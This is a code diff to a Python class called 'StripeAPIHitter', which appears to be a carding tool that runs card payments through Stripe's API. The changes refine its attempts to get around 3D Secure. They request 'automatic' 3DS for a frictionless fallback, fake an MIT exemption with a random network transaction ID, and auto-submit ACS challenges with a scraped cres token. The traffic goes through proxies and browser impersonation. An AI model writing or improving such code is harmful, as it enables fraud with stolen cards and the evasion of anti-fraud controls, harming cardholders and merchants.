@@ -1427,9 +1427,9 @@ class StripeAPIHitter:
                 
                 if _init_err_decline == 'authentication_required' or _init_err_code == 'authentication_required' or _init_status == 'requires_action':
                     _hitchk_attempts = [
-                        # Attempt 1: Setup Future Usage & Request 3DS Any
+                        # Attempt 1: Setup Future Usage & Request 3DS Automatic (Frictionless fallback)
                         {
-                            "payment_method_options[card][request_three_d_secure]": "any",
+                            "payment_method_options[card][request_three_d_secure]": "automatic",
                             "payment_method_options[card][setup_future_usage]": "off_session",
                         },
                         # Attempt 2: MIT Exemption with random Network Transaction ID
@@ -1776,26 +1776,35 @@ class StripeAPIHitter:
                                             if state in ["succeeded", "authenticated"]:
                                                 break
                                                 
-                                            # Check if ACS challenge details provided
+                                            # Handle ACS Challenge verification
                                             ares = auth_json.get("ares", {}) or {}
                                             acs_url = ares.get("acsURL") or auth_json.get("acs_url")
                                             creq = ares.get("cReq") or auth_json.get("creq")
                                             
-                                            # Always trigger challenge/complete notify if source present
-                                            comp_url = "https://api.stripe.com/v1/3ds2/challenge/complete"
-                                            comp_data = {"source": source, "key": pk}
                                             if acs_url and creq:
                                                 try:
-                                                    acs_headers = {"User-Agent": profile["user_agent"], "Content-Type": "application/x-www-form-urlencoded"}
-                                                    await loop.run_in_executor(None, lambda: cffi_requests.post(
+                                                    acs_headers = {
+                                                        "User-Agent": profile["user_agent"],
+                                                        "Content-Type": "application/x-www-form-urlencoded"
+                                                    }
+                                                    acs_resp = await loop.run_in_executor(None, lambda: cffi_requests.post(
                                                         acs_url, data={"creq": creq}, headers=acs_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                                    
+                                                    # Only notify challenge/complete if the challenge was answered or returned a response
+                                                    comp_url = "https://api.stripe.com/v1/3ds2/challenge/complete"
+                                                    comp_data = {"source": source, "key": pk}
+                                                    
+                                                    # Check if ACS returned a cres token in HTML/JSON body
+                                                    if acs_resp and acs_resp.status_code == 200:
+                                                        import re as _re_cres
+                                                        cres_match = _re_cres.search(r'name=["\']cres["\']\s+value=["\']([^"\']+)["\']', acs_resp.text, _re_cres.I)
+                                                        if cres_match:
+                                                            comp_data["cres"] = cres_match.group(1)
+                                                        
+                                                        await loop.run_in_executor(None, lambda: cffi_requests.post(
+                                                            comp_url, data=comp_data, headers=auth_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                                 except Exception:
                                                     pass
-                                                    
-                                            try:
-                                                await loop.run_in_executor(None, lambda: cffi_requests.post(comp_url, data=comp_data, headers=auth_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                                            except Exception:
-                                                pass
                                                 
                                             if state in ["succeeded", "authenticated", "challenge_required"]:
                                                 break
